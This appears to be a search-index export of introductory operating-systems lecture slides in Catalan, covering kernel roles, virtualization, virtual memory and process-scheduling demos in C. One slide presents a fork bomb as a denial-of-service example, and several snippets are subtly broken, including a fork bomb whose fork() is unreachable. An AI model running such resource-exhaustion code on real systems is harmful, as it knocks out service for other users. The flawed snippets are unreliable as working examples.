    "text": "Complexitat sistemes inform√†tics (III)\nTots els programes necessiten accedir a tot el hardware?\n\nPer suposat que no! Aix√≤ podria causar problemes de seguretat com:\n\nP√®rdua de confidencialitat: Acc√©s no autoritzat a dades sensibles.\nAcc√©s a informaci√≥ restringida: Usuaris no autoritzats podrien veure dades privades.\nDenegaci√≥ de serveis: Un programa podria bloquejar l‚Äôacc√©s a recursos per a altres programes.\n\n\n\nQu√® pot passar si un programa pot accedir a tota la RAM?\n\n\nUn programa de l‚Äôusuari Jordi amb acc√©s a tota la RAM podria veure les dades del programa de l‚Äôusuari Pere.\nSi el programa falla, podria afectar tot el sistema i requerir un reinici.\n\n\nNo, clar que no! Seguretat: - Si un programa controla tot el sistema, els altres no poden accedir-hi (Denegaci√≥ de serveis). - Diferents usuaris poden tenir diferents dades; si un programa pot accedir a tot, podria veure informaci√≥ restringida. - No necessitem acc√©s a tot el hardware per realitzar les nostres tasques. - Un usuari malintencionat podria danyar el sistema amb un proc√©s defectu√≥s.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#complexitat-sistemes-inform√†tics-iv",
    "href": "slides/01-introduction.html#complexitat-sistemes-inform√†tics-iv",
    "title": "Introducci√≥",
    "section": "Complexitat sistemes inform√†tics (IV)",
    "text": "Complexitat sistemes inform√†tics (IV)\nSi un sistema inform√†tic no est√† ben dissenyat, un programa mal escrit pot fer fallar tot el sistema, per exemple:\nBucle infinit\nint main(){\n    while(1);\n}\nFork bomb\nint main(){\n    while(1);\n    fork();\n}\n\nUn programa o proc√©s pot fer fallar tot el sistema si no est√† ben dissenyat. Per tant, √©s important tenir en compte aquelles situacions per evitar-les. En el primer exemple, tenim un bucle infinit. Aquesta situaci√≥ en els sistemes linux actuals no √©s un problema, ja que el sistema operatiu pot gestionar aquest tipus de situacions. No obstant aix√≤, en sistemes m√©s antics, aquest tipus de bucles podrien fer que el sistema no respongu√©s. En el segon exemple, tenim un bucle infinit i una crida a la funci√≥ fork(). Aquesta funci√≥ crea un nou proc√©s que √©s una c√≤pia exacta del proc√©s pare. Aix√≤ podria fer que el sistema es satur√©s amb molts processos i no pogu√©s respondre. Aquesta situaci√≥ podria requerir un reinici del sistema per recuperar-lo i es un problema en els sistemes actuals. Fixeu-vos com un simple programa pot fer fallar tot el sistema.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qu√®-√©s-un-sistema-operatiu",
    "href": "slides/01-introduction.html#qu√®-√©s-un-sistema-operatiu",
    "title": "Introducci√≥",
    "section": "Qu√® √©s un sistema operatiu?",
    "text": "Qu√® √©s un sistema operatiu?\nUn sistema operatiu (SO) √©s una capa de software que permet la comunicaci√≥ i la gesti√≥ del maquinari habilitant als usuaris l‚Äôexecuci√≥ de programes. El SO actua d‚Äôintermediari (interf√≠cie) entre els usuaris i el maquinari.\n\n\nUn sistema operatiu (SO) √©s una capa de software que permet la comunicaci√≥ i la gesti√≥ del maquinari habilitant als usuaris l‚Äôexecuci√≥ de programes. El SO actua d‚Äôintermediari (interf√≠cie) entre els usuaris i el maquinari.\nPer tant, √©s un programa que controla el maquinari i permet als usuaris interactuar amb ell. Aquesta interacci√≥ pot ser a trav√©s d‚Äôuna interf√≠cie gr√†fica d‚Äôusuari (GUI) o una interf√≠cie de l√≠nia de comandes (CLI). Tamb√©, gestiona els recursos del sistema, com la mem√≤ria, el disc dur i els dispositius d‚Äôentrada/sortida. A m√©s, el SO proporciona funcionalitats com la gesti√≥ de fitxers, la seguretat i la xarxa.\nPodem dir que el SO √©s el cervell del sistema inform√†tic,ja que controla tots els components i permet als usuaris interactuar amb ells. Sense un SO, els usuaris no podrien utilitzar el maquinari del sistema de manera eficient i segura.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qu√®-volen-els-programadors",
    "href": "slides/01-introduction.html#qu√®-volen-els-programadors",
    "title": "Introducci√≥",
    "section": "Qu√® volen els programadors?",
    "text": "Qu√® volen els programadors?\n\n\nUna plataforma‚Ä¶\n\nper executar aplicacions.\ntransparent per evitar la complexitat del hardware.\neficient per utilitzar els recursos de forma √≤ptima.\nportable per utilitzar-ho indepedentment del hardware.\n\n\n\n\n\nDes del punt de vista dels programadors, el que volen √©s una plataforma per executar les seves aplicacions. Aquesta plataforma ha de ser transparent per evitar la complexitat del hardware, eficient per utilitzar els recursos de forma √≤ptima i portable per utilitzar-ho indepedentment del hardware.El kernel √©s la capa interm√®dia que connecta el programari de l‚Äôusuari amb el maquinari f√≠sic de l‚Äôordinador. A la imatge es pot veure com el kernel actua com un pont entre l‚Äôaplicaci√≥ i el maquinari. Quan un programador escriu una aplicaci√≥, no necessita preocupar-se per com funciona el maquinari a nivell de circuits. En canvi, pot utilitzar les funcions proporcionades pel kernel per interactuar amb el maquinari de manera m√©s senzilla i eficient. Els usuaris finals tamb√© es beneficien d‚Äôaquesta abstracci√≥, ja que poden utilitzar aplicacions sense necessitat de con√®ixer els detalls t√®cnics del maquinari. El kernel permet que el mateix codi pugui funcionar en diferents ordinadors amb maquinari diferent. Un programador pot escriure una aplicaci√≥ (com un navegador web) una sola vegada, i el kernel s‚Äôencarregar√† de traduir les seves instruccions per al maquinari espec√≠fic de cada m√†quina. Tamb√© gestiona de manera eficient els recursos del sistema, com el temps de processador, l‚Äô√∫s de la mem√≤ria o l‚Äôacc√©s al disc.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qu√®-ofereix-el-sistema-operatiu",
    "href": "slides/01-introduction.html#qu√®-ofereix-el-sistema-operatiu",
    "title": "Introducci√≥",
    "section": "Qu√® ofereix el sistema operatiu?",
    "text": "Qu√® ofereix el sistema operatiu?\n\n\nServeis\n\nControlar/Gestionar usuaris i aplicacions.\nGestionar la Mem√≤ria.\nSistema de fitxers.\nPlanificadors.\nEines de xarxa.\n\n\nGaranties\n\nSeguretat.\nTranspar√®ncia.\nEfici√®ncia.\nPortabilitat.\nEstabilitat al llarg del temps.\n\n\n\n\n\n\nObserveu que el kernel ens ofereix una interf√≠cie d‚Äôusuari amb serveis com el sistema de fitxers, la gesti√≥ de la mem√≤ria, la planificaci√≥ de processos i les eines de xarxa. I per sota d‚Äôaquestes capes, tenim els drivers que ens permeten interactuar amb el maquinari f√≠sic de l‚Äôordinador.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#com-sorganitza-el-sistema-operatiu",
    "href": "slides/01-introduction.html#com-sorganitza-el-sistema-operatiu",
    "title": "Introducci√≥",
    "section": "Com s‚Äôorganitza el sistema operatiu?",
    "text": "Com s‚Äôorganitza el sistema operatiu?\n\n\n\n\n\n\nMaquina virtual\n√âs la visi√≥ que t√© l‚Äôusuari del sistema operatiu durant una sessi√≥ de treball.\n\nDualitat\nEl sistema operatiu divideix el programari que t√© tots els privilegis(kernel) del programari que no pot accedir a tots els recursos (programes, llibreries, int√®rpret de comandes,‚Ä¶).\n\n\n\nAquest concepte descriu la visi√≥ que tenim nosaltres, els usuaris, del sistema. Quan treballem amb un ordinador, veiem una interf√≠cie amigable: icones, finestres, aplicacions. Aquesta √©s la m√†quina virtual que el sistema operatiu ens crea. √âs una capa abstracta que simplifica les tasques complexes del maquinari i ens permet centrar-nos en el nostre treball. Penseu-hi com una il¬∑lusi√≥: l‚ÄôOS ens amaga la complexitat del maquinari i ens mostra una versi√≥ simplificada, f√†cil de gestionar.\nSota aquesta interf√≠cie amigable hi ha un principi de seguretat fonamental. El sistema operatiu divideix el programari en dos grans grups per q√ºestions de seguretat i estabilitat. El nucli del sistema operatiu, amb acc√©s total al maquinari, i √©s responsable de la gesti√≥ de recursos. Penseu-hi com el cervell de l‚Äôordinador, que pren totes les decisions importants. La resta de programari, com les aplicacions que utilitzem di√†riament, t√© acc√©s limitat als recursos del sistema. Durant una sessi√≥ de treball, el sistema operatiu canvia entre aquests dos modes segons sigui necessari.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qu√®-√©s-una-m√†quina-virtual",
    "href": "slides/01-introduction.html#qu√®-√©s-una-m√†quina-virtual",
    "title": "Introducci√≥",
    "section": "Qu√® √©s una M√†quina Virtual?",
    "text": "Qu√® √©s una M√†quina Virtual?\nLa virtualitzaci√≥ presentar una visi√≥ abstracta dels recursos del sistema. Diversos processos creuen (tenen l‚Äôil¬∑lusi√≥) de disposar sempre d‚Äôun conjunt de recursos (m√†quinaria).\n\nSimplicitat Il¬∑lusi√≥ de propietat de recursos\nA√Øllament Els bugs es donen en un entorn virtual i no f√≠sic.\nProtecci√≥ Els processos no es poden fer mal entre ells.\nPortabilitat Podem executar a totes les plataformes.\n\n\nImagineu-vos que organitzem una LAN-party amb assistents, per√≤ nom√©s hi ha 1 pizza per alimentar-los. Com podem mostrar a cada un el seu propi tros de pizza i mantenir-los compromesos amb el nostre esdeveniment. F√†cil, creem 1 pizza virtual basada en la pizza real i donem a cada encarregat un tros de pizza virtual. Per√≤, aqu√≠ ve un problema si tots els assistents mengen la pizza alhora, no funcionar√†, alguns participants notarien el truc. Tanmateix, si programem els esdeveniments perqu√® molts participants s‚Äôocupin de les activitats i no mengin la pizza, els organitzadors poden intercanviar en temps real la pizza real i la virtual a les taules on els participants descansen, perqu√® s√≥n els √∫nics candidats a menjar i descobrir el truc, aix√≠ que Si mengen, la pizza ha de ser real.Java t√© un sandbox que permet utilitzar el Java independentment d‚Äôon executem.VirtualBox i VMWare ens permeten executar sistemes operatius dins de sistemes operatius. Tenim un sistema operatiu amfitri√≥ (m√†quina f√≠sica) i un o m√©s sistemes operatius virtuals (hostes).Tamb√© √©s possible virtualitzar sobre el hardware sense la necessitat d‚Äôun sistema operatiu (amfitri√≥).Tamb√© tenim virtualitzaci√≥ per contenidors (Docker).",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#models-de-virtualitzaci√≥-dalt-nivell",
    "href": "slides/01-introduction.html#models-de-virtualitzaci√≥-dalt-nivell",
    "title": "Introducci√≥",
    "section": "Models de Virtualitzaci√≥ d‚Äôalt nivell",
    "text": "Models de Virtualitzaci√≥ d‚Äôalt nivell\n\n\n\nVirtualitzaci√≥ Nativa: Hipervisor s‚Äôexecuta directament sobre el maquinari f√≠sic sense cap sistema operatiu intermedi. Exemples d‚Äôaquesta tecnologia inclouen VMware ESXi o Microsoft Hyper-V. Aix√≤ ofereix un rendiment molt elevat, ja que no hi ha cap capa addicional entre el maquinari i l‚Äôhipervisor, ideal per a entorns de producci√≥.\nVirtualitzaci√≥ Allotjada: Hipervisor s‚Äôexecuta sobre un sistema operatiu ja existent. Per exemple, en KVM, s‚Äôutilitza Linux com a sistema operatiu base, i sobre aquest es creen les m√†quines virtuals.\nParavirtualitzaci√≥: El sistema operatiu convidat sap que est√† sent virtualitzat i coopera amb l‚Äôhipervisor per millorar el rendiment. Un exemple destacat √©s Xen, que √©s molt utilitzat en entorns cloud per la seva efici√®ncia.\nVirtualitzaci√≥ Assistida per Hardware: Aquest model aprofita les capacitats del processador per accelerar el proc√©s de virtualitzaci√≥. Processadors moderns com els d‚ÄôIntel (VT-x) o AMD (AMD-V) ofereixen suport per a aquest tipus de virtualitzaci√≥ (VMware o Hyper-V).",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qu√®-√©s-la-mem√≤ria-virtual",
    "href": "slides/01-introduction.html#qu√®-√©s-la-mem√≤ria-virtual",
    "title": "Introducci√≥",
    "section": "Qu√® √©s la Mem√≤ria Virtual?",
    "text": "Qu√® √©s la Mem√≤ria Virtual?\n\nLa mem√≤ria virtual permet que cada proc√©s tingui la il¬∑lusi√≥ que t√© acc√©s exclusiu a l‚Äôespai complet d‚Äôadreces de mem√≤ria del processador.\nEn realitat els processos utilitzen diferents regions de la mem√≤ria de l‚Äôordinador, amb algunes regions traslladades al disc si no hi ha prou mem√≤ria per a tothom.\n\n\nLa unitat de gesti√≥ de mem√≤ria (MMU) d‚Äôun processador, que tradueix les adreces virtuals utilitzades pel programa en adreces f√≠siques que representen ubicacions de mem√≤ria reals.\n\n\nUn exemple de virtualitzaci√≥ √©s la mem√≤ria virtual. La mem√≤ria virtual √©s una t√®cnica que permet als sistemes operatius utilitzar la mem√≤ria de manera m√©s eficient i segura. Aquesta t√®cnica crea una il¬∑lusi√≥ per als processos que els fa creure que tenen acc√©s exclusiu a l‚Äôespai complet d‚Äôadreces de mem√≤ria del processador. En realitat, els processos utilitzen diferents regions de la mem√≤ria de l‚Äôordinador, amb algunes regions traslladades al disc si no hi ha prou mem√≤ria per a tothom. Aquesta t√®cnica permet que els processos s‚Äôexecutin de manera a√Øllada, evitant que un proc√©s pugui accedir a la mem√≤ria d‚Äôun altre proc√©s. Aix√≤ √©s important per garantir la seguretat i la estabilitat del sistema. La unitat de gesti√≥ de mem√≤ria (MMU) d‚Äôun processador √©s la responsable de traduir les adreces virtuals utilitzades pel programa en adreces f√≠siques que representen ubicacions de mem√≤ria reals. Aquesta traducci√≥ es fa mitjan√ßant taules de p√†gines que mapejen les adreces virtuals a les adreces f√≠siques. Aquest proc√©s l‚Äôestudiarem m√©s endavant en detall.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-s√≥n-els-rols-so-i",
    "href": "slides/01-introduction.html#quins-s√≥n-els-rols-so-i",
    "title": "Introducci√≥",
    "section": "Quins s√≥n els rols SO? (I)",
    "text": "Quins s√≥n els rols SO? (I)\nIl¬∑lusionista\nOfereix una interf√≠cie simple i f√†cil d‚Äôutilitzar per als recursos f√≠sics d‚Äôuna m√†quina o sistema, ocultant la complexitat t√®cnica.\n\n\n\n\n\n\n\nExemple\n\n\nPermet als usuaris utilitzar una impressora (hardware) sense con√®ixer els detalls t√®cnics d‚Äôaquesta impresora, com la interf√≠cie de comunicaci√≥, els controladors o els protocols de comunicaci√≥, disposem d‚Äôuna funci√≥ (imprimir) que ens permet enviar un document a la impressora.\n\n\n\n\n\nEl sistema operatiu actua com un il¬∑lusionista que ens ofereix una interf√≠cie simple i f√†cil d‚Äôutilitzar per als recursos f√≠sics d‚Äôuna m√†quina o sistema, ocultant la complexitat t√®cnica. Per exemple, quan utilitzem una impressora, no necessitem con√®ixer els detalls t√®cnics d‚Äôaquesta impressora, com la interf√≠cie de comunicaci√≥, els controladors o els protocols de comunicaci√≥. En canvi, podem utilitzar una funci√≥ simple com ‚Äúimprimir‚Äù que ens permet enviar un document a la impressora sense preocupar-nos pels detalls t√®cnics. Aix√≤ fa que l‚Äô√∫s de la tecnologia sigui m√©s accessible i f√†cil per als usuaris.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-s√≥n-els-rols-so-ii",
    "href": "slides/01-introduction.html#quins-s√≥n-els-rols-so-ii",
    "title": "Introducci√≥",
    "section": "Quins s√≥n els rols SO? (II)",
    "text": "Quins s√≥n els rols SO? (II)\nIl¬∑lusionista\nProporciona una abstracci√≥ que permet a una aplicaci√≥ tenir √∫s exclusiu dels recursos quan sigui necessari, sense interfer√®ncies d‚Äôaltres aplicacions.\n\n\n\n\n\n\n\nExemple\n\n\nPermet utilitzar un programa de videoconfer√®ncia que utilitza la c√†mera i el micr√≤fon i ens garantitza que cap altre programa pugui utiltizar-los al mateix temps.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-s√≥n-els-rols-so-iii",
    "href": "slides/01-introduction.html#quins-s√≥n-els-rols-so-iii",
    "title": "Introducci√≥",
    "section": "Quins s√≥n els rols SO? (III)",
    "text": "Quins s√≥n els rols SO? (III)\nIl¬∑lusionista\nOferir una il¬∑lusi√≥ d‚Äôinfinitat per als recursos de maquinari, assegurant que les aplicacions puguin continuar funcionant sense problemes.\n\n\n\n\n\n\n\nExemple\n\n\n\nPermet a un usuari tenir m√∫ltiples aplicacions obertes alhora, tot i que nom√©s una estigui en primer pla.\n\nCrea una il¬∑lusi√≥ on cada proc√©s creu que √©s propietari dels recursos hardware.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-s√≥n-els-rols-so-v",
    "href": "slides/01-introduction.html#quins-s√≥n-els-rols-so-v",
    "title": "Introducci√≥",
    "section": "Quins s√≥n els rols SO? (V)",
    "text": "Quins s√≥n els rols SO? (V)\n√Ärbitre\nResponsable de distribuir els recursos disponibles entre usuaris i aplicacions de manera eficient i justa.\n\n\n\n\n\n\n\nExemple\n\n\nUn sistema amb m√∫ltiples usuaris, el temps de processador s‚Äôha de repartir de manera equitativa entre tots els usuaris que executen aplicacions.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-s√≥n-els-rols-so-vi",
    "href": "slides/01-introduction.html#quins-s√≥n-els-rols-so-vi",
    "title": "Introducci√≥",
    "section": "Quins s√≥n els rols SO? (VI)",
    "text": "Quins s√≥n els rols SO? (VI)\n√Ärbitre\nGaranteix la segregaci√≥ i la protecci√≥ d‚Äôusuaris i aplicacions.\n\n\n\n\n\n\n\nExemple\n\n\nImpedint que una aplicaci√≥ bloquegi o afecti el funcionament d‚Äôaltres aplicacions.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-s√≥n-els-rols-so-vii",
    "href": "slides/01-introduction.html#quins-s√≥n-els-rols-so-vii",
    "title": "Introducci√≥",
    "section": "Quins s√≥n els rols SO? (VII)",
    "text": "Quins s√≥n els rols SO? (VII)\nPega\nProporciona un conjunt de serveis i funcionalitats comunes que poden ser compartits i reutilitzats per diverses parts d‚Äôun sistema.\n\nCompartici√≥: Simplifica \\(\\Rightarrow\\) s‚Äôassumeixen sempre les mateixes primitives b√†siques.\nReutilitzaci√≥: Evita torna a implementar funcionalitats comunes. Permet evolucionar de forma independent els components.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#el-sistema-de-fitxers",
    "href": "slides/01-introduction.html#el-sistema-de-fitxers",
    "title": "Introducci√≥",
    "section": "El Sistema de Fitxers",
    "text": "El Sistema de Fitxers\nUn exemple de la funci√≥ de pega del sistema operatiu √©s el sistema de fitxers:\n\nProporciona una interf√≠cie est√†ndard per a la creaci√≥, lectura, escriptura i eliminaci√≥ de fitxers de format transparent (read, write, open, close, ‚Ä¶)\nEns permet implementar libc que proporciona funcions d‚Äôentrada/sortida d‚Äôalt nivell (fopen, fread, fwrite, fclose, ‚Ä¶)",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-i",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-i",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (I)",
    "text": "An√†lisi: Qu√® fa aquest programa? (I)\n\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, \n    char *argv[])\n{\n  while(1)\n  {\n    printf(\"%s\\n\", argv[1]);\n  }\n  return 0\n}\n\n./prog H\n\nH  H  ‚Ä¶\n\n\n./prog H & ./prog O\n???",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-ii",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-ii",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (II)",
    "text": "An√†lisi: Qu√® fa aquest programa? (II)\n\n\nEn primer lloc, el programa c s‚Äôha de compilar amb un compilador i enlla√ßar amb les llibreries del sistema que ens proporciona el sistema operatiu.\nUn cop tenim un executable, si l‚Äôexecutem el sistema operatiu crear√† una estructura anomenada proc√©s on es guardar√† un identificador, un espai de mem√≤ria,‚Ä¶ aquesta estructura √©s una de les abstraccions essencials per la funci√≥ d‚Äôil¬∑lusionisme.\nFixeu-vos que el mateix programa pot ser executat dos cops i el sistema operatiu generar√† 2 processos diferents. Amb identificadors diferents i espai de memoria diferent.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-iii",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-iii",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (III)",
    "text": "An√†lisi: Qu√® fa aquest programa? (III)\n\n\nPer tant, el sistema operatiu utilitzant el planificador assignar√† el processador (assumimim que nom√©s tenim 1 core) a 1 proc√©s durant un temps determinat i anir√† intercanviant (canvi de context) aquest proc√©s cada X temps, d‚Äôaquesta manera cada proc√©s creu tenir tots els recursos per ells (il¬∑lusi√≥).",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-iv",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-iv",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (IV)",
    "text": "An√†lisi: Qu√® fa aquest programa? (IV)\n\n\nPer fer-ho, el sistema operatiu guard√† una foto de l‚Äôestat actual del proc√©s a mem√≤ria i la recuperar√† m√©s endavant quan li torni a donar dret d‚Äôexecuci√≥.\nNoteu tamb√© que s‚Äôha creat en m√®moria una subregi√≥ independent per cada proc√©s. Quan un proc√©s intenta accedir una zona de mem√≤ria for√† de la seva subregi√≥ o inexistent es dona el fam√≥s SEGMENTATION FAULT.\nCom en l‚Äô√∫ltim exemple on el proc√©s intenta accedir a una zona de mem√≤ria que no li pertany. Aix√≤ √©s una de les funcions de protecci√≥ que ens ofereix el sistema operatiu. Al llarg del curs veurem amb m√©s detall com funcionen tots aquests mecanismes.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-v",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-v",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (V)",
    "text": "An√†lisi: Qu√® fa aquest programa? (V)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, \n    char *argv[])\n{\n  while(1)\n  {\n    printf(\"%s\\n\", argv[1]);\n  }\n  return 0\n}\n\nDepenen de la prioritat dels procesesos A o B poden tenir m√©s temps de CPU que l‚Äôaltre i sortir els missatges de forma desordenada.\n./prog H & ./prog O\n\n\n\n\nH  H  H  ‚Ä¶\n\nH  O  H  ‚Ä¶\n\nO  O  H  ‚Ä¶",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-vi",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-vi",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (VI)",
    "text": "An√†lisi: Qu√® fa aquest programa? (VI)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, \n    char *argv[])\n{\n  while(1)\n  {\n    printf(\"%s\\n\", argv[1]);\n  }\n  return 0\n}\n\n./prog & ; ./prog O\n?????",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-vii",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-vii",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (VII)",
    "text": "An√†lisi: Qu√® fa aquest programa? (VII)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, \nchar *argv[])\n{\n  while(1)\n  {\n    printf(\"%s\\n\", argv[1]);\n  }\n  return 0\n}\n\n./prog & ; ./prog O\nSegmentation Fault  O  O  ‚Ä¶",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-viii",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-viii",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (VIII)",
    "text": "An√†lisi: Qu√® fa aquest programa? (VIII)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char *argv[])\n{\n  int *p = malloc(sizeof(int));\n  printf(\"p: %p\\n\", p);\n  int i = 1;\n  while (1) {\n    *p = i;\n    printf(\"(%d) p: %d\\n\", getpid(), *p);\n    i++;\n  }\n  free(p);\n  return 0;\n}\n\n./prog1\n\n(611) p: 0x5570014a02a0\n(611) p: 1\n(611) p: 2\n(611) p: 3\n(611) p: 4\n\n\n./prog1 & ./prog1\n????",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-ix",
    "href": "slides/01-introduction.html#an√†lisi-qu√®-fa-aquest-programa-ix",
    "title": "Introducci√≥",
    "section": "An√†lisi: Qu√® fa aquest programa? (IX)",
    "text": "An√†lisi: Qu√® fa aquest programa? (IX)\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char *argv[])\n{\n  int *p = malloc(sizeof(int));\n  printf(\"p: %p\\n\", p);\n  int i = 1;\n  while (1) {\n    *p = i;\n    printf(\"(%d) p: %d\\n\", getpid(), *p);\n    i++;\n  }\n  free(p);\n  return 0;\n}\n\nAquest programa crea un proc√©s que reserva mem√≤ria din√†mica per a un enter i imprimeix l‚Äôadre√ßa de mem√≤ria i el valor de l‚Äôenter en un bucle infinit. Si executem aquest programa dues vegades en paral¬∑lel, cada proc√©s tindr√† la seva pr√≤pia c√≤pia de la variable p i, per tant, les adreces de mem√≤ria seran diferents. Aix√≤ √©s gr√†cies a la mem√≤ria virtual que ens proporciona el sistema operatiu, que a√Ølla els processos entre si i els permet utilitzar les mateixes adreces de mem√≤ria sense interferir-se. El %p en la funci√≥ printf s‚Äôutilitza per imprimir l‚Äôadre√ßa de mem√≤ria en format hexadecimal veure m√©s informaci√≥ sobre els especificadors de format en C a printf.\n\n./prog1 & ./prog1\n(611) p: 0x5570014a02a0\n(612) p: 0x5570014a02a0\n(611) p: 1\n(612) p: 1\n(611) p: 2\n(612) p: 2\n\n\n\n\n\n\n\nExplicaci√≥\n\n\nLes adre√ßes virtuals protegeixen els processosos entre ells i permeten que tots dos processos puguin fer servir la mateixa adre√ßa sense afectar-se.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-i",
    "href": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-i",
    "title": "Introducci√≥",
    "section": "Reptes en el disseny dels SO (I)",
    "text": "Reptes en el disseny dels SO (I)\n\nComplexitat de la programaci√≥ distribu√Øda (concurrent i paral¬∑lela).\nComplexitat pel context (m√≤bil, IoT, servidors, centres de dades, ‚Ä¶).\nComplexitat per la gran varietat d‚Äôelements de maquinari (heterogene√Øtat).\nComplexitat en la portabilitat i la compatibilitat.\nEquilibri entre funcionalitat i rendiment.\nEquilibri entre rendiment i √∫s d‚Äôenergia.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-ii",
    "href": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-ii",
    "title": "Introducci√≥",
    "section": "Reptes en el disseny dels SO (II)",
